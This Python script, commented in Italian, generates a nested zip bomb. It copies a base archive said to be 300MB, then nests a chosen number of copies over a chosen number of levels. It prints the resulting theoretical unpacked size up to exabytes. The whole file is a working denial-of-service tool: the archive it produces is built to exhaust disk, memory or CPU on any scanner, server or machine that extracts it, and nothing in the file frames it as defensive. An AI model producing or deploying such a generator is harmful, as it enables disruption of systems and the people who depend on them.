import zipfile, os
from shutil import copyfile
from os.path import basename

dimension = 0.3 #Dimensione del file iniziale

def initialCopy():
    """
    Copio il file da 300MB gia' zippato, che sarebbe il file di base
    da cui partire, in un nuovo file temporaneo che alla fine sarà
    l'output del programma
    """
    copyfile("file.zip","bomb.zip")

def deleteZipped():
    """
    Elimino i precedenti file temporanei che non
    ci servono più
    """
    folder = 'toZip/'
    if not os.path.exists(folder):
        os.mkdir(folder)
    for the_file in os.listdir(folder):
        file_path = os.path.join(folder, the_file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
        except Exception as e:
            print(e)

def zipfiles():
    """
    zippo gli n files in uno unico.
    passaggio che viene fatto in ogni livello dell'albero 
    di compessione.
    """
    folder = 'toZip/'
    jungle_zip = zipfile.ZipFile(f'bomb.zip', 'w')
    for the_file in os.listdir(folder):
        file_path = os.path.join(folder, the_file)
        try:
            if os.path.isfile(file_path):
                jungle_zip.write(f'{folder}{the_file}',basename(the_file), compress_type=zipfile.ZIP_DEFLATED)
        except Exception as e:
            print(e)
    jungle_zip.close()

def copyZip(n):
    """
    Copio il file zippato negli n voluti in ogni livello.
    """
    for i in range(n):
        copyfile("bomb.zip",f"toZip/Bomb{i}.zip")



if __name__ == "__main__":

    deep = int(input("insert deep level : ")) #profondità dell'albero
    entity = int(input("insert number of entity per level : ")) #Numero di entità per livello dell'albero
    initialCopy()
    print(f'BASE FILE SIZE = {dimension} GB')

    for i in range(deep):
        deleteZipped()
        copyZip(entity)
        zipfiles()
        dimension = dimension*entity
        print(f"Level {i+1} Dimension = {dimension} GB")
    
    print(f"\nFinal Dimension = {dimension} GB")
    print(f"Final Dimension = {dimension/1024} TB")
    print(f"Final Dimension = {dimension/(1024**2)} PB")
    print(f"Final Dimension = {dimension/(1024**3)} EB")
